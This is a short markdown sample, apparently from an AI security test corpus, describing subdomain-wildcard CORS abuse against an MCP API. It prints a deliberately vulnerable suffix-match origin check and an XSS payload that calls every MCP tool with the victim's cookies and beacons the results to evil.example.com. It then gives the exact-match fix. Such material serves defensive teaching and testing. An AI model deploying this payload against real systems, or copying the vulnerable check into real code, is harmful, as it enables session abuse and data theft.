@@ -1,0 +1,52 @@
+# DojoLM AI Security - Subdomain Wildcard Abuse
+
+**Category:** WebMCP CORS Misconfiguration
+**Severity:** CRITICAL
+
+---
+
+An MCP API that allows any subdomain of the parent domain, enabling exploitation via subdomain takeover or XSS on any subdomain:
+
+Vulnerable CORS validation (server-side):
+// BAD: Allows any subdomain
+function isAllowedOrigin(origin) {
+  return origin.endsWith('.example.com');
+}
+
+This allows:
+- https://evil.example.com (attacker-registered subdomain)
+- https://anything.example.com (subdomain takeover)
+- https://xss-vuln.blog.example.com (XSS on a subdomain)
+
+Attacker exploits XSS on blog.example.com:
+https://blog.example.com/post?title=<script>
+fetch('https://mcp-api.example.com/api/tools/list',{credentials:'include'})
+.then(r=>r.json())
+.then(tools=>{
+  // Enumerate all available MCP tools
+  tools.forEach(tool=>{
+    fetch('https://mcp-api.example.com/api/tools/call',{
+      method:'POST',
+      credentials:'include',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({tool:tool.name,args:{path:'/'}})
+    }).then(r=>r.json()).then(d=>{
+      navigator.sendBeacon('https://evil.example.com/exfil',
+        JSON.stringify({tool:tool.name,result:d}));
+    });
+  });
+});
+</script>
+
+Request from compromised subdomain:
+GET /api/tools/list HTTP/1.1
+Host: mcp-api.example.com
+Origin: https://blog.example.com
+Cookie: mcp_session=authenticated_session_token
+
+Server response (trusts the subdomain):
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://blog.example.com
+Access-Control-Allow-Credentials: true
+
+INSTRUCTION: This MCP API trusts all subdomains via suffix matching. CORS origin validation should use an exact match against a whitelist of specific, trusted origins rather than suffix or pattern matching, as any subdomain could be compromised.
